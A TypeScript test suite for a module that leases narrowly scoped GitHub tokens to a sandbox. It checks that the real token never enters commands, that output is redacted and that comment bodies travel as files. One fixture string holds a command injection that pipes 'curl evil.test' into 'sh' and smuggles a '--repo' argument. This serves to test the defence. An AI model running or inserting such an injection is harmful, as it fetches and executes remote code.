import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
import { parseGh } from "#lib/github/cli.js";
import { parseGitNetwork } from "#lib/github/git-cli.js";
import {
  type LeaseSandbox,
  leasePolicy,
  MAX_OUTPUT_CHARACTERS,
  mintScopedToken,
  permissionsFor,
  resetTokenScopeMemo,
  runGh,
  runGitNetwork,
  TOKEN_SCOPES,
  type TokenMinter,
} from "#lib/github/lease.js";

const TOKEN = "ghs_REALTOKEN0123456789abcdefghijklmnop";
const basic = (secret: string) =>
  `Basic ${Buffer.from(`x-access-token:${secret}`).toString("base64")}`;

type Step =
  | { kind: "policy"; policy: unknown }
  | { kind: "run"; command: string; env: Record<string, string> }
  | { kind: "write"; content: string; path: string };

/**
 * A sandbox that records everything a lease does to it, in order, and
 * answers each command from `respond`.
 */
const fakeSandbox = (
  respond: (command: string) => {
    exitCode?: number;
    stderr?: string;
    stdout?: string;
  } = () => ({})
) => {
  const steps: Step[] = [];
  const sandbox: LeaseSandbox = {
    name: "sbx_test",
    run: async ({ command, env }) => {
      steps.push({ command, env: env ?? {}, kind: "run" });
      const result = respond(command);
      return {
        exitCode: result.exitCode ?? 0,
        stderr: result.stderr ?? "",
        stdout: result.stdout ?? "",
      };
    },
    setNetworkPolicy: async (policy) => {
      steps.push({ kind: "policy", policy });
    },
    writeTextFile: async ({ content, path }) => {
      steps.push({ content, kind: "write", path });
    },
  };
  return { sandbox, steps };
};

const mintOk = (): {
  mint: TokenMinter;
  requests: (readonly string[] | null)[];
} => {
  const requests: (readonly string[] | null)[] = [];
  return {
    mint: async (permissions) => {
      requests.push(permissions);
      return TOKEN;
    },
    requests,
  };
};

const gh = (...args: string[]) => {
  const parsed = parseGh(args);
  if (!parsed.ok) {
    throw new Error(parsed.reason);
  }
  return parsed.invocation;
};

const git = (...args: string[]) => {
  const parsed = parseGitNetwork(args);
  if (!parsed.ok) {
    throw new Error(parsed.reason);
  }
  return parsed.invocation;
};

beforeEach(() => {
  resetTokenScopeMemo();
  // The suite's expectations are about the defaults, whatever the developer's shell exports.
  vi.stubEnv("FACTORY_TOKEN_FALLBACK", "");
  vi.stubEnv("FACTORY_ALLOW_WORKFLOW_CHANGES", "");
});

afterEach(() => {
  vi.unstubAllEnvs();
  vi.restoreAllMocks();
});

describe("runGh: one command, one lease", () => {
  test("the credential is attached, the command runs, and the lease always ends", async () => {
    const { sandbox, steps } = fakeSandbox(() => ({
      stdout: '{"title":"Login returns 500"}',
    }));
    const { mint } = mintOk();
    const result = await runGh(
      sandbox,
      gh("issue", "view", "12", "--json", "title"),
      "repo-read",
      {
        id: () => "lease-1",
        mint,
      }
    );
    expect(result).toEqual({
      exitCode: 0,
      stderr: "",
      stdout: '{"title":"Login returns 500"}',
      truncated: false,
    });
    expect(steps.map((step) => step.kind)).toEqual(["policy", "run", "policy"]);
    expect(steps[0]).toEqual({
      kind: "policy",
      policy: leasePolicy("gh", TOKEN, "factory-lease-1"),
    });
    expect(steps[2]).toEqual({ kind: "policy", policy: "allow-all" });
  });

  test("the real token never reaches the sandbox: not in the command, not in the environment", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint } = mintOk();
    await runGh(sandbox, gh("pr", "view", "34"), "repo-read", {
      id: () => "lease-2",
      mint,
    });
    const run = steps.find((step) => step.kind === "run");
    expect(run?.kind === "run" && run.command).toBe(
      "/usr/bin/gh 'pr' 'view' '34'"
    );
    const env = run?.kind === "run" ? run.env : {};
    expect(env.GH_TOKEN).toBe("factory-lease-2");
    expect(env.GH_REPO).toBe("acme/widgets");
    expect(env.GH_PROMPT_DISABLED).toBe("1");
    expect(env.PATH).toBe("/usr/local/bin:/usr/bin:/bin");
    expect(JSON.stringify(run)).not.toContain(TOKEN);
    expect(JSON.stringify(run)).not.toContain(basic(TOKEN));
  });

  test("the firewall swaps the placeholder for the token on GitHub's API hosts only", () => {
    const policy = leasePolicy("gh", TOKEN, "factory-abc");
    expect(policy).toEqual({
      allow: {
        "*": [],
        "api.github.com": [
          {
            match: {
              headers: [
                {
                  key: { exact: "authorization" },
                  value: { regex: "^(?:token|Bearer) factory-abc$" },
                },
              ],
            },
            transform: [{ headers: { authorization: `Bearer ${TOKEN}` } }],
          },
        ],
        "uploads.github.com": [expect.anything()],
      },
    });
  });

  test("a git lease swaps the placeholder on the git hosts only, as basic auth", () => {
    const policy = leasePolicy("git", TOKEN, "factory-abc");
    expect(policy).toEqual({
      allow: {
        "*": [],
        "codeload.github.com": [expect.anything()],
        "github.com": [
          {
            match: {
              headers: [
                {
                  key: { exact: "authorization" },
                  value: { exact: basic("factory-abc") },
                },
              ],
            },
            transform: [{ headers: { authorization: basic(TOKEN) } }],
          },
        ],
      },
    });
  });

  test("the lease ends even when the command throws", async () => {
    const { sandbox, steps } = fakeSandbox(() => {
      throw new Error("sandbox went away");
    });
    const { mint } = mintOk();
    await expect(
      runGh(sandbox, gh("issue", "view", "1"), "repo-read", { mint })
    ).rejects.toThrow(/sandbox went away/);
    expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
  });

  test("when no token can be minted, nothing runs and no policy is set", async () => {
    const { sandbox, steps } = fakeSandbox();
    await expect(
      runGh(sandbox, gh("issue", "view", "1"), "repo-read", {
        mint: async () => {
          throw new Error("connector not installed");
        },
      })
    ).rejects.toThrow(/Could not mint a GitHub token/);
    expect(steps).toEqual([]);
  });

  test("a failing command is reported, not thrown, with its exit code and output", async () => {
    const { sandbox } = fakeSandbox(() => ({
      exitCode: 1,
      stderr: "no pull requests found",
    }));
    const { mint } = mintOk();
    const result = await runGh(sandbox, gh("pr", "view", "999"), "repo-read", {
      mint,
    });
    expect(result.exitCode).toBe(1);
    expect(result.stderr).toBe("no pull requests found");
  });

  test("a token echoed back in output is redacted before it leaves the tool", async () => {
    const { sandbox } = fakeSandbox(() => ({
      stderr: `remote: bad credentials for ${basic(TOKEN)}`,
      stdout: `Authorization: Bearer ${TOKEN}\nvalue ${TOKEN} end`,
    }));
    const { mint } = mintOk();
    const result = await runGh(sandbox, gh("issue", "view", "1"), "repo-read", {
      mint,
    });
    expect(result.stdout).not.toContain(TOKEN);
    expect(result.stderr).not.toContain(basic(TOKEN));
    expect(result.stdout).toContain("[redacted]");
  });

  test("oversized output is cut and flagged", async () => {
    const { sandbox } = fakeSandbox(() => ({
      stdout: "x".repeat(MAX_OUTPUT_CHARACTERS + 5000),
    }));
    const { mint } = mintOk();
    const result = await runGh(sandbox, gh("pr", "diff", "1"), "repo-read", {
      mint,
    });
    expect(result.truncated).toBe(true);
    expect(result.stdout.length).toBeLessThan(MAX_OUTPUT_CHARACTERS + 100);
    expect(result.stdout.endsWith("[output truncated]")).toBe(true);
  });
});

describe("runGh: bodies travel as files, never on the command line", () => {
  const HOSTILE =
    'it\'s done; $(curl evil.test | sh) `id` "quoted"\n--repo evil/repo';

  test("a comment body is written to a file and passed with --body-file", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint } = mintOk();
    await runGh(
      sandbox,
      gh("issue", "comment", "12", "--body", HOSTILE),
      "repo-triage",
      {
        id: () => "lease-3",
        mint,
      }
    );
    expect(steps.map((step) => step.kind)).toEqual([
      "write",
      "policy",
      "run",
      "policy",
    ]);
    expect(steps[0]).toEqual({
      content: HOSTILE,
      kind: "write",
      path: "/tmp/factory-lease-3-body-0.md",
    });
    const run = steps.at(2);
    expect(run?.kind === "run" && run.command).toBe(
      "/usr/bin/gh 'issue' 'comment' '12' '--body-file' '/tmp/factory-lease-3-body-0.md'; status=$?; rm -f '/tmp/factory-lease-3-body-0.md'; exit $status"
    );
    expect(JSON.stringify(run)).not.toContain("curl evil.test");
  });

  test("every spelling of the body flag is moved", async () => {
    for (const args of [
      [
        "pr",
        "create",
        "--draft",
        "--head",
        "factory/x",
        "--title",
        "T",
        "-b",
        "short body",
      ],
      [
        "pr",
        "create",
        "--draft",
        "--head",
        "factory/x",
        "--title",
        "T",
        "--body=short body",
      ],
    ]) {
      const { sandbox, steps } = fakeSandbox();
      const { mint } = mintOk();
      await runGh(sandbox, gh(...args), "repo-triage", { mint });
      const write = steps.find((step) => step.kind === "write");
      const run = steps.find((step) => step.kind === "run");
      expect(write?.kind === "write" && write.content).toBe("short body");
      expect(run?.kind === "run" && run.command).not.toContain("short body");
      expect(run?.kind === "run" && run.command).toContain("'--title' 'T'");
    }
  });

  test("-b on a command where it means branch is left alone", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint } = mintOk();
    await runGh(sandbox, gh("run", "list", "-b", "factory/x"), "repo-read", {
      mint,
    });
    expect(steps.some((step) => step.kind === "write")).toBe(false);
    const run = steps.find((step) => step.kind === "run");
    expect(run?.kind === "run" && run.command).toBe(
      "/usr/bin/gh 'run' 'list' '-b' 'factory/x'"
    );
  });
});

describe("runGitNetwork", () => {
  test("a push leases a contents-write token; the placeholder rides in git's own config", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint, requests } = mintOk();
    await runGitNetwork(sandbox, git("push", "origin", "factory/bug-x"), {
      id: () => "lease-4",
      mint,
    });
    expect(requests[0]).toEqual(["contents:write"]);
    expect(steps[0]).toEqual({
      kind: "policy",
      policy: leasePolicy("git", TOKEN, "factory-lease-4"),
    });
    const run = steps.at(1);
    const env = run?.kind === "run" ? run.env : {};
    expect(env).toEqual({
      GIT_CONFIG_COUNT: "4",
      GIT_CONFIG_KEY_0: "http.https://github.com/.extraheader",
      GIT_CONFIG_KEY_1: "core.hooksPath",
      GIT_CONFIG_KEY_2: "protocol.allow",
      GIT_CONFIG_KEY_3: "protocol.https.allow",
      GIT_CONFIG_VALUE_0: `Authorization: ${basic("factory-lease-4")}`,
      GIT_CONFIG_VALUE_1: "/dev/null",
      GIT_CONFIG_VALUE_2: "never",
      GIT_CONFIG_VALUE_3: "always",
      GIT_TERMINAL_PROMPT: "0",
      PATH: "/usr/local/bin:/usr/bin:/bin",
    });
    expect(JSON.stringify(run)).not.toContain(TOKEN);
    expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
  });

  test("a fetch leases a read-only token", async () => {
    const { sandbox } = fakeSandbox();
    const { mint, requests } = mintOk();
    await runGitNetwork(sandbox, git("fetch", "origin", "factory/bug-x"), {
      mint,
    });
    expect(requests[0]).toEqual([
      ...TOKEN_SCOPES["repo-read"].required,
      ...TOKEN_SCOPES["repo-read"].optional,
    ]);
    expect(requests[0]).not.toContain("contents:write");
  });
});

describe("leases on one sandbox never overlap", () => {
  test("concurrent calls run one after another, each inside its own set/reset pair", async () => {
    const order: string[] = [];
    let release: (() => void) | undefined;
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    const sandbox: LeaseSandbox = {
      name: "sbx_shared",
      run: async ({ command }) => {
        order.push(`run:${command}`);
        if (command.includes("'1'")) {
          await gate;
        }
        return { exitCode: 0, stderr: "", stdout: "" };
      },
      setNetworkPolicy: async (policy) => {
        order.push(policy === "allow-all" ? "reset" : "lease");
      },
      writeTextFile: async () => undefined,
    };
    const { mint } = mintOk();
    const first = runGh(sandbox, gh("issue", "view", "1"), "repo-read", {
      mint,
    });
    const second = runGh(sandbox, gh("issue", "view", "2"), "repo-read", {
      mint,
    });
    await Promise.resolve();
    await new Promise((resolve) => setImmediate(resolve));
    expect(order).toEqual(["lease", "run:/usr/bin/gh 'issue' 'view' '1'"]);
    release?.();
    await Promise.all([first, second]);
    expect(order).toEqual([
      "lease",
      "run:/usr/bin/gh 'issue' 'view' '1'",
      "reset",
      "lease",
      "run:/usr/bin/gh 'issue' 'view' '2'",
      "reset",
    ]);
  });

  test("a failed lease does not block the next one", async () => {
    const { sandbox, steps } = fakeSandbox((command) => {
      if (command.includes("'1'")) {
        throw new Error("boom");
      }
      return { stdout: "ok" };
    });
    const { mint } = mintOk();
    const first = runGh(sandbox, gh("issue", "view", "1"), "repo-read", {
      mint,
    });
    const second = runGh(sandbox, gh("issue", "view", "2"), "repo-read", {
      mint,
    });
    await expect(first).rejects.toThrow(/boom/);
    expect((await second).stdout).toBe("ok");
    expect(steps.filter((step) => step.kind === "policy")).toHaveLength(4);
  });
});

describe("token scopes", () => {
  test("no scope except repo-push can write repository contents, and none can change workflows by default", () => {
    for (const scope of ["repo-read", "repo-triage", "repo-push"] as const) {
      const { optional, required } = permissionsFor(scope);
      const all = [...required, ...optional];
      expect(all).not.toContain("workflows:write");
      expect(all).not.toContain("administration:write");
      if (scope !== "repo-push") {
        expect(all).not.toContain("contents:write");
      }
    }
    expect(TOKEN_SCOPES["repo-triage"].required).toEqual([
      "contents:read",
      "issues:write",
      "pull_requests:write",
    ]);
    expect(
      TOKEN_SCOPES["repo-read"].required.every((entry) =>
        entry.endsWith(":read")
      )
    ).toBe(true);
  });

  test("workflow changes are an explicit opt-in on the push scope only", () => {
    vi.stubEnv("FACTORY_ALLOW_WORKFLOW_CHANGES", "1");
    expect(permissionsFor("repo-push")).toEqual({
      optional: ["workflows:write"],
      required: ["contents:write"],
    });
    expect(permissionsFor("repo-read")).toBe(TOKEN_SCOPES["repo-read"]);
    expect(permissionsFor("repo-triage")).toBe(TOKEN_SCOPES["repo-triage"]);
  });

  test("the widest set the installation grants is requested first, and remembered", async () => {
    const requests: (readonly string[] | null)[] = [];
    const mint: TokenMinter = async (permissions) => {
      requests.push(permissions);
      return TOKEN;
    };
    await mintScopedToken("repo-triage", { mint });
    await mintScopedToken("repo-triage", { mint });
    const full = [
      ...TOKEN_SCOPES["repo-triage"].required,
      ...TOKEN_SCOPES["repo-triage"].optional,
    ];
    expect(requests).toEqual([full, full]);
  });

  test("an installation without the optional permissions gets the required set", async () => {
    const requests: (readonly string[] | null)[] = [];
    const mint: TokenMinter = async (permissions) => {
      requests.push(permissions);
      if (permissions?.includes("checks:read")) {
        throw new Error("422: permissions not granted to this installation");
      }
      return TOKEN;
    };
    expect(await mintScopedToken("repo-read", { mint })).toBe(TOKEN);
    expect(requests.at(-1)).toEqual(TOKEN_SCOPES["repo-read"].required);
    await mintScopedToken("repo-read", { mint });
    expect(requests).toHaveLength(3);
    expect(requests.at(-1)).toEqual(TOKEN_SCOPES["repo-read"].required);
  });

  test("by default a scope never widens: when narrowing is refused the command fails, whatever the error", async () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
    let installationCalls = 0;
    for (const failure of [
      "422: permissions not granted",
      "ETIMEDOUT",
      "500 Internal Server Error",
    ]) {
      resetTokenScopeMemo();
      const requests: (readonly string[] | null)[] = [];
      await expect(
        mintScopedToken("repo-read", {
          installationToken: async () => {
            installationCalls += 1;
            return "FULL-INSTALLATION-TOKEN";
          },
          mint: async (permissions) => {
            requests.push(permissions);
            throw new Error(failure);
          },
        })
      ).rejects.toThrow(/Could not mint a GitHub token for scope "repo-read"/);
      expect(requests).toHaveLength(2);
      expect(requests).not.toContain(null);
    }
    expect(installationCalls).toBe(0);
    expect(warn).not.toHaveBeenCalled();
  });

  test("the failure names the permissions to check and the setting that would allow a wider token", async () => {
    await expect(
      mintScopedToken("repo-triage", {
        mint: async () => {
          throw new Error("refused");
        },
      })
    ).rejects.toThrow(
      /contents:read, issues:write, pull_requests:write.*FACTORY_TOKEN_FALLBACK=repository/s
    );
  });

  test("FACTORY_TOKEN_FALLBACK=repository allows the app's permissions on the factory repository, and says so", async () => {
    vi.stubEnv("FACTORY_TOKEN_FALLBACK", "repository");
    const warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
    let installationCalls = 0;
    const requests: (readonly string[] | null)[] = [];
    const token = await mintScopedToken("repo-triage", {
      installationToken: async () => {
        installationCalls += 1;
        return "FULL";
      },
      mint: async (permissions) => {
        requests.push(permissions);
        if (permissions !== null) {
          throw new Error("unsupported");
        }
        return TOKEN;
      },
    });
    expect(token).toBe(TOKEN);
    expect(requests.at(-1)).toBeNull();
    expect(installationCalls).toBe(0);
    expect(warn).toHaveBeenCalledTimes(1);
    expect(String(warn.mock.calls[0]?.[0])).toMatch(/could not be narrowed/);
  });

  test("an empty token is treated as a failure, not as a credential", async () => {
    await expect(
      mintScopedToken("repo-read", { mint: async () => "" })
    ).rejects.toThrow(/Could not mint a GitHub token/);
  });

  test("a remembered rung that stops working is forgotten, and the ladder is walked again", async () => {
    const installation: { grantsChecks: boolean } = { grantsChecks: true };
    const requests: (readonly string[] | null)[] = [];
    const mint: TokenMinter = async (permissions) => {
      requests.push(permissions);
      if (!installation.grantsChecks && permissions?.includes("checks:read")) {
        throw new Error("422: permission removed");
      }
      return TOKEN;
    };
    await mintScopedToken("repo-read", { mint });
    installation.grantsChecks = false;
    expect(await mintScopedToken("repo-read", { mint })).toBe(TOKEN);
    expect(requests.at(-1)).toEqual(TOKEN_SCOPES["repo-read"].required);
  });
});
